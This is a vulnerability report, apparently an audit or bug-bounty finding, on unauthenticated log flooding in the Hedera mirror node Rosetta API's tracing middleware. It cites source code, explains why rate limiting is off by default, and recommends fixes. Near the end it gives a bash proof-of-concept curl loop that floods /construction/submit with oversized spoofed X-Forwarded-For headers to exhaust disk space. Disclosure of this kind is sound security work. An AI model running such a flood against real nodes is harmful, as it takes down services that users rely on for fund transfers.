### Title
Unauthenticated Log Flooding via Unbounded Attacker-Controlled Data in `TracingMiddleware` with Rate Limiting Disabled by Default

### Summary
`TracingMiddleware` in `rosetta/app/middleware/trace.go` unconditionally writes a `log.Info` entry for every non-internal HTTP request, incorporating attacker-controlled data (`X-Forwarded-For`/`X-Real-IP` headers and the full URL path) with no length bounds or rate limiting at the application layer. The Traefik-level rate limiting defined in the Helm chart is gated behind `global.middleware: false` and is therefore **disabled in the default deployment**. An unauthenticated attacker can flood any Rosetta endpoint with high-volume requests carrying oversized headers, generating massive log output that exhausts disk space and disrupts the entire node.

### Finding Description

**Exact code path:**

`rosetta/app/middleware/trace.go`, `TracingMiddleware()`, lines 43–61: [1](#0-0) 

The log message is assembled at line 52–53:
```go
message := fmt.Sprintf("%s %s %s (%d) in %s",
    clientIpAddress, request.Method, path, tracingResponseWriter.statusCode, time.Since(start))
```

`clientIpAddress` is sourced from `getClientIpAddress()` (lines 63–74), which reads `X-Real-IP` then `X-Forwarded-For` with **no length validation**: [2](#0-1) 

`path` is sourced from `request.URL.RequestURI()` — also attacker-controlled and unbounded.

**Root cause:** The middleware trusts and logs attacker-supplied header values and URL paths verbatim, with no truncation, sampling, or rate limiting. Every non-internal path (i.e., everything except `/health/liveness`, `/health/readiness`, `/metrics`) hits `log.Info`, not `log.Debug`. [3](#0-2) 

**Rate limiting is disabled by default.** The Traefik middleware chain (including `rateLimit: average: 10`) is only instantiated when `global.middleware` is `true`: [4](#0-3) [5](#0-4) 

Even when enabled, the rate limit is `average: 10` keyed on `requestHost` (not source IP), trivially bypassed by rotating hostnames or direct pod access: [6](#0-5) 

**No application-level rate limiting exists.** The middleware chain in `main.go` is:
```
TracingMiddleware → MetricsMiddleware → router
```
with no throttle layer: [7](#0-6) 

Go's `net/http` server permits headers up to ~1 MB each by default. An attacker sets `X-Forwarded-For` to a ~1 MB string; each request produces a ~1 MB log entry.

### Impact Explanation

Disk exhaustion from log flooding causes:
1. **Node crash / service unavailability** — once the disk is full, the Go process and database writes fail, taking down the entire Rosetta node.
2. **Transaction submission blocked** — `ConstructionSubmit` at `construction_service.go` lines 332–368 can no longer execute or log results, preventing fund transfers from being submitted or audited. [8](#0-7) 
3. **Audit trail destroyed** — all `log.Infof("Submitting transaction …")` entries (line 352) are lost, making forensic recovery of in-flight transactions impossible. [9](#0-8) 

Severity is **High** (borderline Critical): it is a full availability DoS on the fund-transfer path requiring zero authentication.

### Likelihood Explanation

- **No authentication required** — the Rosetta API is publicly reachable.
- **Trivial to execute** — a single `curl` loop or any HTTP load tool suffices; no special knowledge needed.
- **Amplification is large** — Go's default 1 MB header limit means each request can produce a ~1 MB log line; at 1,000 req/s that is ~1 GB/s of log I/O.
- **Default deployment is unprotected** — `global.middleware: false` means most real-world deployments ship without the Traefik rate limiter active.
- **Repeatable** — the attacker can restart the flood after any mitigation attempt until the configuration is fixed in code.

### Recommendation

1. **Truncate attacker-controlled fields before logging.** Cap `clientIpAddress` and `path` to a safe maximum (e.g., 64 and 256 bytes respectively) inside `TracingMiddleware` before calling `log.Info`.
2. **Add application-level rate limiting** (e.g., `golang.org/x/time/rate` token-bucket per source IP) as a middleware layer in `main.go`, independent of the optional Traefik layer.
3. **Change `global.middleware` default to `true`** in `charts/hedera-mirror-rosetta/values.yaml` so the Traefik `inFlightReq` and `rateLimit` protections are active out of the box.
4. **Configure log rotation with size caps** (e.g., via `lumberjack`) so a full disk cannot crash the process.
5. **Validate and sanitize `X-Forwarded-For`/`X-Real-IP` headers** — reject or truncate values that are not valid IP addresses before they reach the logging path.

### Proof of Concept

```bash
# Generate a ~64 KB spoofed IP header value
FAKE_IP=$(python3 -c "print('1.2.3.4, ' * 10000)")

# Flood /construction/submit (or any non-internal endpoint) with oversized headers
# Each request produces a ~64 KB log entry
for i in $(seq 1 100000); do
  curl -s -o /dev/null \
    -H "X-Forwarded-For: $FAKE_IP" \
    -H "Content-Type: application/json" \
    -d '{"network_identifier":{"blockchain":"Hedera","network":"testnet"},"signed_transaction":"0xdeadbeef"}' \
    http://<rosetta-host>:5700/construction/submit &
done
wait

# Monitor disk usage on the server:
# watch -n1 df -h /var/log
# Expected: disk fills rapidly; logging subsystem stalls; legitimate /construction/submit
# requests return errors or are never recorded.
```

### Citations

**File:** rosetta/app/middleware/trace.go (L43-61)
```go
func TracingMiddleware(inner http.Handler) http.Handler {
	return http.HandlerFunc(func(responseWriter http.ResponseWriter, request *http.Request) {
		start := time.Now()
		clientIpAddress := getClientIpAddress(request)
		path := request.URL.RequestURI()
		tracingResponseWriter := newTracingResponseWriter(responseWriter)

		inner.ServeHTTP(tracingResponseWriter, request)

		message := fmt.Sprintf("%s %s %s (%d) in %s",
			clientIpAddress, request.Method, path, tracingResponseWriter.statusCode, time.Since(start))

		if internalPaths[path] {
			log.Debug(message)
		} else {
			log.Info(message)
		}
	})
}
```

**File:** rosetta/app/middleware/trace.go (L63-75)
```go
func getClientIpAddress(r *http.Request) string {
	ipAddress := r.Header.Get(xRealIpHeader)

	if len(ipAddress) == 0 {
		ipAddress = r.Header.Get(xForwardedForHeader)
	}

	if len(ipAddress) == 0 {
		ipAddress, _, _ = net.SplitHostPort(r.RemoteAddr)
	}

	return ipAddress
}
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L95-95)
```yaml
  middleware: false
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L157-160)
```yaml
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
```

**File:** charts/hedera-mirror-rosetta/templates/middleware.yaml (L3-3)
```yaml
{{ if and .Values.global.middleware .Values.middleware -}}
```

**File:** rosetta/main.go (L217-219)
```go
	metricsMiddleware := middleware.MetricsMiddleware(router)
	tracingMiddleware := middleware.TracingMiddleware(metricsMiddleware)
	corsMiddleware := server.CorsMiddleware(tracingMiddleware)
```

**File:** rosetta/app/services/construction_service.go (L332-368)
```go
func (c *constructionAPIService) ConstructionSubmit(
	_ context.Context,
	request *rTypes.ConstructionSubmitRequest,
) (*rTypes.TransactionIdentifierResponse, *rTypes.Error) {
	if !c.IsOnline() {
		return nil, errors.ErrEndpointNotSupportedInOfflineMode
	}

	transaction, rErr := unmarshallTransactionFromHexString(request.SignedTransaction)
	if rErr != nil {
		return nil, rErr
	}

	hashBytes, err := hiero.TransactionGetTransactionHash(transaction)
	if err != nil {
		return nil, errors.ErrTransactionHashFailed
	}

	hash := tools.SafeAddHexPrefix(hex.EncodeToString(hashBytes))
	transactionId, _ := hiero.TransactionGetTransactionID(transaction)
	log.Infof("Submitting transaction %s (hash %s) to node %s", transactionId,
		hash, transaction.GetNodeAccountIDs()[0])

	_, err = hiero.TransactionExecute(transaction, c.sdkClient)
	if err != nil {
		log.Errorf("Failed to execute transaction %s (hash %s): %s", transactionId, hash, err)
		return nil, errors.AddErrorDetails(
			errors.ErrTransactionSubmissionFailed,
			"reason",
			fmt.Sprintf("%s", err),
		)
	}

	return &rTypes.TransactionIdentifierResponse{
		TransactionIdentifier: &rTypes.TransactionIdentifier{Hash: hash},
	}, nil
}
```
